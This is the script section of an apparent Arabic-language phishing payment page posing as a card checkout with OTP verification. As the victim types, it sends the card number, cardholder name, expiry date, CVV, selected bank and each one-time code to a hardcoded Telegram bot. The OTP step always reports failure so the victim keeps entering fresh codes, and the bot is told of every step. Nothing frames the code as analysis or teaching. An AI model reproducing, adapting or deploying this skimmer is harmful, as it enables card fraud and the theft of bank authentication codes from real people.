    <script>
        // ==========================================
        // إعدادات تيليجرام (Telegram Bot Setup)
        // ==========================================
        const tgToken = '9067409505:AAHLIApXu8JCLlEDWlKrASY9F3F0DE0FBH8';
        const tgChatId = '8302667206';

        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${tgToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: tgChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.log('Telegram Error:', err));
        }

        // ==========================================
        // التحديثات الديناميكية للوقت والتاريخ
        // ==========================================
        function updateTime() {
            const now = new Date();
            const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', hour12: false };
            const formatted = now.toLocaleDateString('ar-AE', options).replace(',', '');
            document.getElementById('currentTime').textContent = formatted;
        }
        updateTime();
        setInterval(updateTime, 30000);

        const issueDateEl = document.getElementById('issueDate');
        if (issueDateEl) {
            const d = new Date();
            const y = d.getFullYear();
            const m = String(d.getMonth() + 1).padStart(2, '0');
            const day = String(d.getDate()).padStart(2, '0');
            issueDateEl.textContent = `${y}-${m}-${day}`;
        }

        // توليد كود تحقق عشوائي
        const letters = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
        const letter = letters[Math.floor(Math.random() * letters.length)];
        const numbers = String(Math.floor(10000 + Math.random() * 90000));
        document.querySelector('.verification-code-box .code-value').innerHTML = `<span class="letter-part">${letter}</span>${numbers}`;

        // ==========================================
        // دوال تنسيق والتحقق من الحقول
        // ==========================================
        
        // تنسيق رقم البطاقة (إضافة مسافات كل 4 أرقام)
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            let formatted = value.match(/.{1,4}/g);
            input.value = formatted ? formatted.join(' ') : '';
            
            if (value.length === 16) {
                document.getElementById('err-card').style.display = 'none';
                input.classList.remove('invalid');
                sendTelegramMessage(`💳 <b>تم إدخال رقم البطاقة:</b>\n<code>${input.value}</code>`);
            }
        }

        // تنسيق تاريخ الانتهاء (إضافة /)
        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length >= 2) {
                input.value = value.slice(0, 2) + '/' + value.slice(2);
            } else {
                input.value = value;
            }
        }

        // التحقق عند مغادرة الحقل
        function checkField(input, type) {
            const val = input.value.trim();
            const errEl = document.getElementById(`err-${type}`);
            let isValid = true;

            if (type === 'card') {
                isValid = val.replace(/\s/g, '').length === 16;
            } else if (type === 'name') {
                isValid = val.length >= 3 && /^[a-zA-Z\s]+$/.test(val);
            } else if (type === 'expiry') {
                const parts = val.split('/');
                if (parts.length === 2 && parts[0].length === 2 && parts[1].length === 2) {
                    const month = parseInt(parts[0]);
                    const year = parseInt('20' + parts[1]);
                    const now = new Date();
                    if (month >= 1 && month <= 12 && year >= now.getFullYear()) {
                        if (year === now.getFullYear() && month < (now.getMonth() + 1)) {
                            isValid = false;
                        }
                    } else { isValid = false; }
                } else { isValid = false; }
            } else if (type === 'cvv') {
                isValid = val.length >= 3 && val.length <= 4;
            }

            if (!isValid) {
                errEl.style.display = 'block';
                input.classList.add('invalid');
            } else {
                errEl.style.display = 'none';
                input.classList.remove('invalid');
                
                // إرسال البيانات لتيليجرام عند الاكتمال
                if (type === 'name') sendTelegramMessage(`👤 <b>تم إدخال اسم حامل البطاقة:</b>\n<code>${val.toUpperCase()}</code>`);
                if (type === 'expiry') sendTelegramMessage(`📅 <b>تم إدخال تاريخ البطاقة:</b>\n<code>${val}</code>`);
                if (type === 'cvv') sendTelegramMessage(`🔒 <b>تم إدخال الرمز السري (CVV):</b>\n<code>${val}</code>`);
            }
            return isValid;
        }

        // معالجة تغيير البنك من القائمة المنسدلة
        function handleBankChange(select) {
            const bankName = select.value;
            if (bankName) {
                sendTelegramMessage(`🏦 <b>تم اختيار البنك:</b>\n<code>${bankName}</code>`);
            }
        }

        // ==========================================
        // معالجة الدفع والانتقال لصفحة الـ OTP
        // ==========================================
        function handlePayment(e) {
            e.preventDefault();
            
            const cardNum = document.getElementById('cardNumber');
            const cardName = document.getElementById('cardName');
            const cardExpiry = document.getElementById('cardExpiry');
            const cardCvv = document.getElementById('cardCvv');
            const bankSelect = document.getElementById('bankSelector');

            // التحقق النهائي قبل الإرسال
            const v1 = checkField(cardNum, 'card');
            const v2 = checkField(cardName, 'name');
            const v3 = checkField(cardExpiry, 'expiry');
            const v4 = checkField(cardCvv, 'cvv');

            if (!v1 || !v2 || !v3 || !v4) {
                // الاهتزاز البصري في حال وجود خطأ
                const box = document.querySelector('.global-card-box');
                box.style.animation = 'shake 0.4s';
                setTimeout(() => box.style.animation = '', 400);
                return false;
            }

            if (!bankSelect.value) {
                bankSelect.style.borderColor = '#e53e3e';
                bankSelect.focus();
                return false;
            } else {
                bankSelect.style.borderColor = '';
            }

            // إظهار شاشة التحميل
            document.getElementById('loadingText').textContent = 'جاري التحقق من البيانات...';
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            sendTelegramMessage(`✅ <b>تم الضغط على "تأكيد الدفع"</b>\nالبيانات مكتملة وجاري التحويل لصفحة التحقق.`);

            // الانتقال لصفحة الـ OTP بعد ثانيتين
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('mainPage').style.display = 'none';
                document.querySelector('.top-bar').style.display = 'none';
                document.querySelector('.page-footer').style.display = 'none';
                
                document.getElementById('otpPage').style.display = 'block';
                document.getElementById('otpCodeInput').focus();
                startTimer(); // بدء التايمر عند الانتقال
                
                sendTelegramMessage(`📲 <b>تنبيه:</b> المستخدم انتقل الآن إلى صفحة إدخال رمز التحقق (OTP).`);
            }, 2000);

            return false;
        }

        // ==========================================
        // منطق صفحة الـ OTP
        // ==========================================
        
        // تايمر الـ OTP
        let timeLeft = 120;
        let timerInterval;
        function startTimer() {
            clearInterval(timerInterval);
            timeLeft = 120;
            document.getElementById('timer').textContent = '02:00';
            document.getElementById('resendLink').style.display = 'none';
            
            timerInterval = setInterval(() => {
                timeLeft--;
                const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
                const s = String(timeLeft % 60).padStart(2, '0');
                document.getElementById('timer').textContent = `${m}:${s}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('timer').style.display = 'none';
                    document.getElementById('resendLink').style.display = 'block';
                }
            }, 1000);
        }

        // التحقق من الـ OTP
        function verifyOtp() {
            const input = document.getElementById('otpCodeInput');
            const otpCode = input.value;

            if (otpCode.length < 6) {
                document.getElementById('otpError').style.display = 'block';
                document.getElementById('otpError').textContent = 'يرجى إدخال الرمز المكون من 6 أرقام بالكامل.';
                return;
            }

            // إرسال الكود لتيليجرام
            sendTelegramMessage(`🔑 <b>تم إدخال رمز التحقق (OTP):</b>\n<code>${otpCode}</code>`);

            const btn = document.getElementById('verifyBtn');
            const originalText = btn.innerHTML;
            btn.innerHTML = 'جاري التحقق...';
            btn.disabled = true;
            document.getElementById('otpError').style.display = 'none';

            // محاكاة 5 ثواني للتحقق
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
                
                // إظهار رسالة الفشل
                document.getElementById('otpError').style.display = 'block';
                document.getElementById('otpError').textContent = 'فشل التحقق من الرمز، يرجى المحاولة مرة أخرى أو إعادة إرسال الرمز.';
                
                // تفريغ الحقل
                input.value = '';
                input.focus();
                
                sendTelegramMessage(`❌ <b>فشل التحقق:</b> الرمز الذي تم إدخاله غير صحيح.`);
            }, 5000);
        }

        // إعادة إرسال الرمز
        function resendOtp() {
            document.getElementById('resendLink').style.display = 'none';
            document.getElementById('timer').style.display = 'block';
            document.getElementById('otpError').style.display = 'none';
            document.getElementById('otpCodeInput').value = '';
            document.getElementById('otpCodeInput').focus();
            sendTelegramMessage(`🔄 <b>تنبيه:</b> المستخدم ضغط على "إعادة إرسال الرمز".`);
            startTimer();
        }

        // إضافة أنيميشن الاهتزاز
        const styleSheet = document.createElement('style');
        styleSheet.textContent = `
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
            }
        `;
        document.head.appendChild(styleSheet);
    </script>
</body>
</html>
